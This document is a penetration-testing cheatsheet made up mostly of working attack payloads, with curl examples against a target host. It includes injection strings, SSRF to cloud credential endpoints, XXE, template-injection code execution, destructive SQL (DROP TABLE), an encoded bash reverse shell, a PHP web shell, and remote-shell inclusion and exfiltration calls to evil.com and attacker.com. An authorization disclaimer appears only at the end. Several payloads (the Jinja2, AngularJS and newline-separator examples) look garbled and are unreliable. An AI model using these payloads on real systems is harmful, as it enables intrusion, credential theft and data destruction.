# Penetration Testing Payloads Cheatsheet

This comprehensive cheatsheet provides a curated collection of working payloads organized by category for security testing purposes. All payloads are designed for legitimate penetration testing, vulnerability assessment, and security research on systems you have explicit authorization to test. Each category includes detailed explanations of what the payload tests, how to use it, and what indicators to look for in the response.

---

## 1. HTTP Header Injection Payloads

Header injection vulnerabilities occur when user-supplied data is reflected in HTTP response headers without proper sanitization. These payloads test for CRLF injection, response splitting, and header manipulation vulnerabilities that can lead to cross-site scripting, cache poisoning, or HTTP response splitting attacks.

### 1.1 CRLF Injection Probes

CRLF (Carriage Return Line Feed) injection tests whether the application properly sanitizes newline characters in header values. The sequence `\r\n` (or `%0d%0a` URL-encoded) represents the end of an HTTP header, and successful injection allows attackers to inject additional headers or even body content.

**Basic CRLF injection test:**
```
User-Agent: Mozilla/5.0\r\nX-Injected-Header: test
```
This payload attempts to inject a custom header `X-Injected-Header` by terminating the User-Agent header prematurely. If the server reflects this header in its response, it confirms CRLF injection vulnerability.

**URL-encoded variant for query parameters:**
```
%0d%0aX-Injected-Header:%20test
```
Use this encoding when testing through URL parameters or form fields that get reflected in headers server-side.

**Multi-line injection for response splitting:**
```
User-Agent: Mozilla/5.0\r\n\r\n<html><body>Malicious Content</body></html>
```
This payload attempts to inject actual HTML content after the headers, which could lead to web cache poisoning or XSS if the response is cached.

### 1.2 Host Header Attack Payloads

Host header vulnerabilities arise when applications trust the Host header without proper validation. This can lead to password reset poisoning, web cache poisoning, and SSRF attacks against internal infrastructure.

**Host header override attempt:**
```
Host: gole.africa.com\r\nX-Forwarded-Host: evil.com
```
This tests whether the application prioritizes X-Forwarded-Host over the Host header, which is common in reverse proxy configurations and can lead to host header injection attacks.

**Double host header:**
```
Host: gole.africa.com
Host: evil.com
```
Some parsing implementations only validate the first occurrence or the last occurrence, allowing attackers to bypass validation by including multiple Host headers.

**Empty Host with absolute URL:**
```
GET /admin HTTP/1.1
Host: 
Referer: https://evil.com/
```
Tests whether the application correctly handles empty Host headers when an absolute URL is provided in the request line.

### 1.3 CORS Misconfiguration Payloads

Cross-Origin Resource Sharing (CORS) misconfigurations can lead to unauthorized cross-origin data access. These payloads test whether the server properly validates the Origin header and doesn't expose sensitive data to malicious domains.

**Wildcard Origin test:**
```
Origin: https://evil.com
```
Observe whether the response includes `Access-Control-Allow-Origin: *` or echoes back `https://evil.com`, which would allow any site to make cross-origin requests.

**Null origin test:**
```
Origin: null
```
Tests whether the server accepts the null origin, which can be abused using data: URLs or sandboxed iframes.

**Subdomain origin test:**
```
Origin: https://subdomain.gole.africa.com
```
If the main domain is whitelisted, sometimes subdomains are also trusted inadvertently.

### 1.4 Cookie Manipulation Payloads

Cookie-based vulnerabilities often allow authentication bypass, privilege escalation, or session fixation attacks. These payloads test various cookie manipulation techniques.

**Privilege escalation cookie:**
```
Cookie: isAdmin=true; role=admin; userId=1
```
Tests whether the application trusts cookie values for authorization decisions without server-side verification.

**Session fixation test:**
```
Cookie: sessionId=known_value; PHPSESSID=known_value
```
Attempts to fixate a session ID that was obtained prior to authentication.

**Cookie null byte injection:**
```
Cookie: session=admin%00
```
Tests for null byte termination vulnerabilities in cookie parsing that could bypass length limits or validation.

---

## 2. Parameter Manipulation Payloads

Parameter manipulation attacks target user-controllable inputs that influence application behavior. These payloads are particularly effective against APIs, web services, and applications using JSON or XML data formats.

### 2.1 JSON-RPC Payload Variations

JSON-RPC APIs are commonly found in modern web applications and often have interesting attack surface. The following payloads test various aspects of JSON-RPC implementations including integer overflow, type confusion, and method enumeration.

**Integer overflow/id fuzzing:**
```json
{"id": -1, "jsonrpc": "2.0", "method": "call", "params": {}}
{"id": 99999999999999999999, "jsonrpc": "2.0", "method": "call", "params": {}}
{"id": 0, "jsonrpc": "2.0", "method": "call", "params": {}}
```
Testing extreme integer values can reveal type confusion vulnerabilities, integer overflow issues, or cause different code paths to execute. Some implementations handle negative IDs differently than positive ones, potentially revealing debug endpoints or alternative error handling.

**String injection in ID field:**
```json
{"id": "../../../etc/passwd", "jsonrpc": "2.0", "method": "call", "params": {}}
{"id": "'; DROP TABLE users; --", "jsonrpc": "2.0", "method": "call", "params": {}}
{"id": "<script>alert(1)</script>", "jsonrpc": "2.0", "method": "call", "params": {}}
```
Tests for SQL injection, path traversal, and XSS vulnerabilities in ID field handling. If the ID is logged or displayed back to users without sanitization, these payloads may reveal stored XSS or log injection vulnerabilities.

**Array/object type confusion:**
```json
{"id": [], "jsonrpc": "2.0", "method": "call", "params": {}}
{"id": {}, "jsonrpc": "2.0", "method": "call", "params": {}}
{"id": null, "jsonrpc": "2.0", "method": "call", "params": {}}
{"id": true, "jsonrpc": "2.0", "method": "call", "params": {}}
```
Type confusion payloads test whether the application properly validates JSON data types. Some JSON parsers or deserialization libraries have different behaviors when receiving unexpected types.

### 2.2 Method Name Payloads

The method field in JSON-RPC requests is often mapped directly to function calls on the server. This attack surface is frequently under-protected and can reveal debug methods, admin functionality, or internal APIs.

**Debug/admin method discovery:**
```json
{"id": 1, "jsonrpc": "2.0", "method": "debug", "params": {}}
{"id": 1, "jsonrpc": "2.0", "method": "admin", "params": {}}
{"id": 1, "jsonrpc": "2.0", "method": "system.listMethods", "params": {}}
{"id": 1, "jsonrpc": "2.0", "method": "help", "params": {}}
{"id": 1, "jsonrpc": "2.0", "method": "Introspect", "params": {}}
{"id": 1, "jsonrpc": "2.0", "method": "getVersion", "params": {}}
```
These payloads attempt to invoke common debug, administrative, or introspection methods that may have been accidentally exposed in production environments.

**Method name traversal:**
```json
{"id": 1, "jsonrpc": "2.0", "method": "../internal/method", "params": {}}
{"id": 1, "jsonrpc": "2.0", "method": "..\\..\\windows\\system32\\config\\sam", "params": {}}
```
Path traversal in method names can sometimes reach internal namespaces or reveal information about the server's internal structure.

### 2.3 Parameter Injection Payloads

Parameters passed to RPC methods often undergo various processing steps including database queries, command execution, or template rendering. These payloads test for injection vulnerabilities at different stages.

**SQL injection in parameters:**
```json
{"id": 1, "jsonrpc": "2.0", "method": "call", "params": {"username": "admin' OR '1'='1"}}
{"id": 1, "jsonrpc": "2.0", "method": "call", "params": {"userId": "1; SELECT * FROM users--"}}
{"id": 1, "jsonrpc": "2.0", "method": "call", "params": {"email": "test@example.com' WAITFOR DELAY '0:0:5'--"}}
```
Tests for SQL injection by appending common SQL injection patterns to parameter values. The WAITFOR DELAY payload is particularly useful for time-based blind SQL injection detection.

**XSS payloads in parameters:**
```json
{"id": 1, "jsonrpc": "2.0", "method": "call", "params": {"search": "<script>alert(1)</script>"}}
{"id": 1, "jsonrpc": "2.0", "method": "call", "params": {"name": "<img src=x onerror=alert(1)>"}}
{"id": 1, "jsonrpc": "2.0", "method": "call", "params": {"comment": "<svg/onload=alert(1)>"}}
{"id": 1, "jsonrpc": "2.0", "method": "call", "params": {"data": "{{constructor.constructor('alert(1)')()}}"}}
```
Various XSS vectors for testing reflected or stored cross-site scripting. The last payload uses template injection syntax that may bypass basic filters.

**NoSQL injection:**
```json
{"id": 1, "jsonrpc": "2.0", "method": "call", "params": {"username": {"$ne": null}}}
{"id": 1, "jsonrpc": "2.0", "method": "call", "params": {"password": {"$gt": ""}}}
{"id": 1, "jsonrpc": "2.0", "method": "call", "params": {"$where": "this.password.length > 0"}}
```
NoSQL injection payloads for MongoDB and similar databases. The `$ne` operator matches documents where the field is not equal to the specified value, potentially bypassing authentication.

### 2.4 Additional Field Payloads

Applications may not expect certain fields, and including them can reveal hidden functionality or cause unexpected behavior due to mass assignment vulnerabilities.

**Privilege escalation through extra fields:**
```json
{"id": 1, "jsonrpc": "2.0", "method": "call", "params": {}, "isAdmin": true}
{"id": 1, "jsonrpc": "2.0", "method": "call", "params": {}, "role": "administrator"}
{"id": 1, "jsonrpc": "2.0", "method": "call", "params": {}, "permissions": ["read", "write", "delete"]}
{"id": 1, "jsonrpc": "2.0", "method": "call", "params": {}, "_role": "admin"}
```
Tests for mass assignment vulnerabilities where the application accepts and processes additional fields that should be server-side only.

**Nested parameter injection:**
```json
{"id": 1, "jsonrpc": "2.0", "method": "call", "params": {"user": {"name": "test", "admin": true}}}
{"id": 1, "jsonrpc": "2.0", "method": "call", "params": {"__proto__": {"admin": true}}}
```
Nested objects may bypass validation applied only to top-level parameters. The second payload tests prototype pollution in JavaScript environments.

---

## 3. Authentication Bypass Payloads

Authentication bypass vulnerabilities allow attackers to access protected resources without proper credentials. These payloads target common authentication implementation flaws in web applications and APIs.

### 3.1 JWT Manipulation Payloads

JSON Web Tokens (JWT) are widely used for authentication and authorization. Common vulnerabilities include weak signature verification, algorithm confusion, and token tampering.

**Algorithm confusion (RS256 to HS256):**
```
# Modify the JWT header to change alg to HS256, then sign with the public key
{"alg": "HS256", "typ": "JWT"}
```
When an application accepts tokens with different algorithms than expected, attackers can forge tokens using the public key as the HMAC secret.

**None algorithm exploit:**
```
{"alg": "none", "typ": "JWT"}
```
Some JWT libraries accept tokens with `alg: none` and skip signature verification entirely. Remove the signature portion of the token after changing the algorithm.

**Token expiration manipulation:**
```
# Change the exp claim to a far-future timestamp
{"exp": 9999999999, "iat": 1234567890}
```
Tests whether the server properly validates token expiration and doesn't accept expired tokens from before password changes (which could indicate session fixation).

**Kid header manipulation:**
```
{"kid": "../../etc/passwd", "alg": "HS256"}
{"kid": "/dev/null", "alg": "HS256"}
```
The `kid` (key ID) claim may be used to select the verification key. Path traversal here could cause the application to read an attacker-controlled file as the key.

### 3.2 Basic Auth Bypass Payloads

HTTP Basic Authentication is still encountered in legacy systems, APIs, and administrative interfaces. These payloads test for bypass techniques and credential stuffing opportunities.

**Blank password attempt:**
```
Authorization: Basic YWRtaW46
# Decodes to admin:
```
Tests whether the application accepts users with blank passwords.

**Colon-only username:**
```
Authorization: Basic OnBhc3N3b3Jk
# Decodes to :password
```
Some implementations split on the first colon only, treating everything after as password.

**Alternative encoding:**
```
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
# Standard base64 encoding
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
# Same credentials in base64 with trailing newline handling
```
Tests whether different encoding variants are accepted, which could indicate improper decoding implementation.

### 3.3 API Key and Token Leakage Payloads

APIs often rely on API keys or bearer tokens for authentication. These payloads test for various token-related vulnerabilities and information disclosure.

**Bearer token manipulation:**
```
Authorization: Bearer invalid_token
Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.
Authorization: Bearer 
```
Tests token validation strength and how the application handles malformed or missing tokens.

**Multiple authentication headers:**
```
Authorization: Bearer valid_token
X-API-Key: another_key
Cookie: auth=third_token
```
Tests whether the application accepts multiple authentication credentials and which one takes precedence.

---

## 4. Injection Payloads

Injection attacks remain among the most critical web application vulnerabilities. This section covers payloads for SQL injection, command injection, XPath injection, and LDAP injection testing.

### 4.1 SQL Injection Payloads

SQL injection occurs when user input is incorporated into database queries without proper sanitization. These payloads are organized by injection type and database target.

**Authentication bypass (OR-based):**
```
' OR '1'='1' --
' OR 1=1 --
admin' --
' OR ''='
```
Classic authentication bypass payloads that exploit logic errors in login forms.

**UNION-based injection:**
```
' UNION SELECT 1,2,3 --
' UNION SELECT username,password,email FROM users --
' UNION SELECT null,null,null --
' ORDER BY 10--
```
UNION-based payloads extract data from other tables. Start with ORDER BY to determine column count, then use UNION SELECT to extract specific data.

**Time-based blind injection:**
```
' WAITFOR DELAY '0:0:5' --
'; WAITFOR DELAY '0:0:5' --
' OR (SELECT CASE WHEN (1=1) THEN WAITFOR DELAY '0:0:5' ELSE 1 END) --
'; IF (1=1) WAITFOR DELAY '0:0:5' --
```
Time-based payloads cause observable delays when conditions are true, useful when results aren't returned directly.

**Error-based injection:**
```
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT) --
' OR 1=1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 1),0x23,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLUMNS GROUP BY x) --
```
Error-based payloads force the database to return useful information in error messages.

**Boolean-based injection:**
```
' AND 1=1 --
' AND 1=2 --
' OR 'x'='x
' OR 'x'='y
```
Boolean-based injection tests whether the application's response changes based on true/false conditions.

**PostgreSQL specific:**
```
'; SELECT pg_sleep(5) --
' AND (SELECT COUNT(*) FROM pg_shadow) > 0 --
'; DROP TABLE users CASCADE --
```
PostgreSQL-specific payloads including the pg_sleep function for time-based testing.

**MySQL specific:**
```
' AND SLEEP(5) --
' AND BENCHMARK(10000000,SHA1('test')) --
'; FLUSH TABLES --
'; SHOW TABLES --
```
MySQL-specific payloads using SLEEP, BENCHMARK, and information schema queries.

### 4.2 Command Injection Payloads

Command injection vulnerabilities allow attackers to execute arbitrary operating system commands. These payloads work through input fields, HTTP headers, and API parameters that get passed to system commands.

**Basic command separators:**
```
; whoami
| whoami
& whoami
&& whoami
|| whoami
`whoami`
$(whoami)
```
Different command separators and their combinations. Use the appropriate separator based on the target operating system and command context.

**Blind command injection (time-based):**
```
; sleep 5
& ping -c 5 127.0.0.1
|| /bin/sleep 5
; /bin/bash -c "sleep 5"
```
When output isn't visible, use time delays to confirm command execution.

**Command chaining with newlines:**
```
whoami\n
%n%s%n%s%n
```
Some applications filter standard separators but not newline characters, which also serve as command separators on Unix systems.

**Encoded command injection:**
```
echo$IFS$()base64 -d <<< YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwJjA= | bash
# Decodes to: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
```
Encoded payloads can bypass basic input filters and web application firewalls.

### 4.3 NoSQL Injection Payloads

NoSQL databases like MongoDB have their own injection patterns, often exploiting JavaScript execution or operator manipulation.

**Authentication bypass:**
```
{"username": {"$ne": null}, "password": {"$ne": null}}
{"$or": [{"username": "admin"}, {"username": "admin' --"}]}
{"username": {"$regex": "^adm"}}
{"$where": "this.username == 'admin'"}
```
Various MongoDB operator payloads that can bypass authentication checks.

**Data extraction:**
```
{"$where": "function() { return this.password.length > 0; }"}
{"$expr": {"$regex": "^.{32}$"}}
{"username": {"$in": []}}
```
Extraction payloads using JavaScript evaluation and regex operators.

**Time-based NoSQL injection:**
```
"'; sleep(5); var x='
"; function(){var d=new Date();while((new Date()-d)<5000){}; }(); //
```
Time-based payloads for NoSQL injection when boolean-based detection fails.

### 4.4 XPath and LDAP Injection Payloads

XML-based applications and LDAP directories use query languages that can be injected similarly to SQL.

**XPath injection:**
```
' or '1'='1
' or ''='
' or count(/user)=1 or 'x'='y
' or string-length(name())=5 or 'x'='y
```
XPath injection payloads that can extract data from XML documents or bypass authentication.

**LDAP injection:**
```
*)(objectClass=*
*)(uid=*))%00
*()|%26()
admin*)(objectClass=*
```
LDAP injection for directory services authentication bypass and data extraction.

---

## 5. File Inclusion and Path Traversal Payloads

File inclusion vulnerabilities allow attackers to read or execute files on the server. Path traversal attacks manipulate file paths to access files outside the intended directory.

### 5.1 Path Traversal Payloads

Path traversal (also known as directory traversal) exploits improper input validation in file operations.

**Unix path traversal:**
```
../../etc/passwd
../../../../etc/passwd
../../../../../../etc/passwd
../../../..//etc/passwd
....//....//etc/passwd
../../../../../etc/../etc/passwd
```
Standard traversal sequences to reach system files. Add more `../` sequences as needed based on depth.

**Windows path traversal:**
```
..\..\..\Windows\System32\config\sam
..\..\..\..\Windows\win.ini
..\..\..\..\..\boot.ini
....\....\Windows\System32\config\sam
```
Windows-specific path traversal using backslashes.

**Encoded variants:**
```
%2e%2e/%2e%2e/%2e%2e/etc/passwd
%252e%252e/%252e%252e/%252e%252e/etc/passwd
..%2f..%2fetc%2fpasswd
..%5c..%5cWindows%5cSystem32%5cconfig%5csam
```
Double URL encoding, Unicode encoding, and other encoding bypasses.

**Null byte injection:**
```
../../etc/passwd%00
..\..\Windows\win.ini%00
```
Null bytes can terminate file paths early, bypassing extension appending.

### 5.2 Local File Inclusion Payloads

LFI vulnerabilities allow including local files in server-side processing, often leading to code execution when combined with log poisoning or session poisoning.

**Basic LFI tests:**
```
/etc/passwd
/var/log/apache2/access.log
/proc/self/environ
/var/log/nginx/access.log
```
Common files to test LFI, including logs and proc filesystem entries.

**Log poisoning targets:**
```
../../../../var/log/apache2/access.log
../../../../var/log/nginx/access.log
../../../../var/log/mail.log
../../../../../tmp/sess_PHPSESSID
```
Files that might contain user-controlled data that could be poisoned with malicious code.

**PHP wrapper exploitation:**
```
php://filter/convert.base64-encode/resource=index
php://filter/read=string.rot13/resource=index
php://input
data://text/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```
PHP wrapper payloads for information disclosure and code execution.

### 5.3 Remote File Inclusion Payloads

RFI vulnerabilities allow including remote files, typically leading to code execution when the included file contains PHP code.

**Remote code inclusion:**
```
http://evil.com/shell.txt
https://evil.com/malicious.txt
ftp://evil.com/shell.txt
```
Simple remote file inclusion tests.

**Wrapper-based RFI:**
```
data:text/plain,< ?php system($_GET['cmd']); ?>
expect://whoami
php://http://evil.com/shell.txt
```
Alternative wrappers that might bypass restrictions on direct URL inclusion.

---

## 6. Server-Side Request Forgery Payloads

SSRF vulnerabilities allow attackers to make the server make requests to arbitrary destinations, potentially reaching internal services and cloud metadata endpoints.

### 6.1 Internal Network Probing

These payloads test whether the server can reach internal network resources that should not be accessible from the outside.

**Common internal IPs:**
```
http://127.0.0.1:80
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:5432
http://127.0.0.1:6379
http://127.0.0.1:8080
http://127.0.0.1:9000
```
Probing common internal services on localhost.

**Internal network ranges:**
```
http://192.168.1.1:80
http://10.0.0.1:80
http://172.16.0.1:80
```
Testing RFC 1918 private network ranges.

### 6.2 Cloud Metadata Endpoints

Cloud metadata endpoints often contain sensitive information and are a primary target for SSRF attacks in cloud environments.

**AWS EC2 metadata:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
http://169.254.169.254/latest/dynamic/instance-identity/document
```
AWS metadata service accessible from EC2 instances.

**GCP Cloud metadata:**
```
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/project/attributes/
```
Google Cloud metadata endpoints.

**Azure metadata:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oid?api-version=2020-06-01
```
Azure Instance Metadata Service.

### 6.3 Protocol Switching Payloads

Testing different URL schemes that may bypass filters or reach additional attack surface.

**Protocol variations:**
```
dict://127.0.0.1:11211/stat
gopher://127.0.0.1:6379/_INFO
ldap://127.0.0.1:389/(objectClass=*)
sftp://127.0.0.1/
smb://127.0.0.1/share
```
Alternative protocols that may be supported by the underlying URL handler.

---

## 7. XML External Entity Payloads

XXE vulnerabilities exploit XML processors that resolve external entities. These payloads can lead to file disclosure, SSRF, and denial of service.

### 7.1 File Disclosure Payloads

**Basic XXE:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```
Classic XXE file disclosure payload.

**Error-based XXE:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///nonexistent/file">
]>
<data>&xxe;</data>
```
Forces error messages that may include file contents or system information.

**Out-of-band XXE:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
<data>&xxe;</data>
```
Out-of-band data exfiltration when direct output isn't available.

### 7.2 SSRF via XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<data>&xxe;</data>
```
Uses XXE to make HTTP requests to internal services, similar to SSRF.

### 7.3 Denial of Service Payloads

**Billion laughs attack:**
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```
Exponential entity expansion causing memory exhaustion.

---

## 8. Template Injection Payloads

Template injection vulnerabilities occur when user input is embedded in server-side templates without proper escaping. This can lead to code execution depending on the template engine.

### 8.1 Jinja2/SQLAlchemy Payloads

```jinja2
{{7*7}}
{{config}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{% for x in ().__class__.__bases__[0].__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__loader__getspescname__()}}{% endif %}{% endfor %}
```
Jinja2 template injection payloads for Python environments.

### 8.2 AngularJS Payloads

```javascript
{{constructor.prototype.__proto__.__proto__='constructor.prototype.__proto__.__proto__';$eval('x=alert(1)')}}
{{_nginvoker(1)}}
$on.constructor('alert(1)')()
```
AngularJS sandbox escape payloads.

### 8.3 Other Template Engines

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
```
Freemarker template injection for code execution.

---

## 9. Practical Curl Command Examples

The following curl commands demonstrate practical usage of the payloads in this cheatsheet against a target application.

### 9.1 Header Injection Test

```bash
curl -i -X POST https://target.com/endpoint \
  -H 'Host: target.com' \
  -H 'User-Agent: Mozilla/5.0\r\nX-Injected-Header: test' \
  -H 'Content-Type: application/json' \
  -H 'Origin: https://evil.com' \
  --data '{"id": 1, "jsonrpc": "2.0", "method": "call", "params": {}}'
```

This command tests multiple header injection vectors simultaneously: CRLF injection in User-Agent, host header validation, and CORS misconfiguration.

### 9.2 JSON-RPC Fuzzing

```bash
curl -i -X POST https://target.com/endpoint \
  -H 'Content-Type: application/json' \
  --data '{"id": -1, "jsonrpc": "2.0", "method": "call", "params": {"search": "<script>alert(1)</script>"}}'
```

Tests integer overflow and XSS injection through the params object.

### 9.3 Authentication Testing

```bash
curl -i -X POST https://target.com/login \
  -H 'Content-Type: application/json' \
  --data '{"username": "admin'\'' OR '\''1'\''=''\''1", "password": "anything"}'
```

SQL injection authentication bypass test.

### 9.4 SSRF Probing

```bash
curl -i -X GET "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/" \
  -H 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.'
```

Tests for SSRF vulnerability that could reach AWS metadata service. Modify the Authorization header for JWT manipulation testing.

### 9.5 XML Payload Testing

```bash
curl -i -X POST https://target.com/xml-endpoint \
  -H 'Content-Type: application/xml' \
  --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>'
```

XXE file disclosure test.

---

## 10. Testing Methodology and Indicators

When executing these payloads, look for the following indicators in responses that confirm vulnerabilities.

### 10.1 Successful Exploitation Signs

Successful exploitation typically manifests through several observable signs. Reflected payloads in responses indicate that user input is being reflected without proper sanitization, which could lead to XSS or injection vulnerabilities. HTTP 500 errors with stack traces reveal detailed error information that can aid in further exploitation and indicate improper error handling. Privilege escalation occurs when manipulated parameters or cookies grant access to functionality or data that should be restricted, indicating trust in client-side data. Unusual response headers suggest successful header injection, particularly when custom headers appear that were not expected in the response. CORS headers that allow arbitrary origins indicate misconfiguration that could enable cross-origin attacks.

### 10.2 Response Analysis Tips

When analyzing responses, pay attention to response time variations that may indicate time-based injection vulnerabilities, particularly with payloads containing sleep or delay commands. Examine error messages carefully as they often contain file paths, database structures, or other useful information for further exploitation. Check for differences between responses to valid and invalid input, as these variations can reveal the application's logic and potential bypass opportunities. Monitor for unusual Content-Types or charset declarations that may indicate content type confusion vulnerabilities.

### 10.3 Recommended Testing Workflow

A systematic approach to payload testing begins with reconnaissance to understand the application's technology stack and entry points, then proceeds through basic payload testing to identify low-hanging vulnerabilities before escalating to more complex exploitation attempts. Document all findings thoroughly and test each vulnerability category methodically rather than randomly firing payloads.

---

## 11. Burp Suite Payload Recommendations

For automated and systematic testing, the following payload categories should be configured in Burp Suite Intruder or similar tools.

### 11.1 Intruder Payload Positions

Configure payload positions for common injection points including URL parameters, POST body parameters, HTTP headers (User-Agent, Referer, Cookie, custom headers), and JSON/XML body content. Use multiple payload sets to test different vulnerability categories simultaneously.

### 11.2 Payload Processing Rules

Apply URL-encoding for payloads sent in URL parameters, double-URL-encoding for payloads that might be decoded server-side, and Base64 encoding for payloads targeting authentication headers. Consider applying case modification and prefix/suffix rules to bypass basic input filters.

### 11.3 Grep Match Rules

Configure response analysis to look for indicators including error keywords (error, exception, warning), file paths (/etc/, C:\, /var/), database-related terms (SELECT, FROM, WHERE), and reflection of the injected payload in the response body.

---

## Security Testing Ethics and Legal Considerations

Before conducting any security testing, ensure you have explicit written authorization from the system owner. Document the scope of your engagement, define clear rules of engagement, and understand that even well-intentioned testing without authorization can be illegal. These payloads should only be used in controlled environments where you have legitimate access for security testing purposes, such as your own infrastructure, bug bounty programs with explicit scope authorization, penetration testing engagements with signed contracts, or vulnerable applications designed for learning in controlled environments like OWASP's intentionally vulnerable web applications.
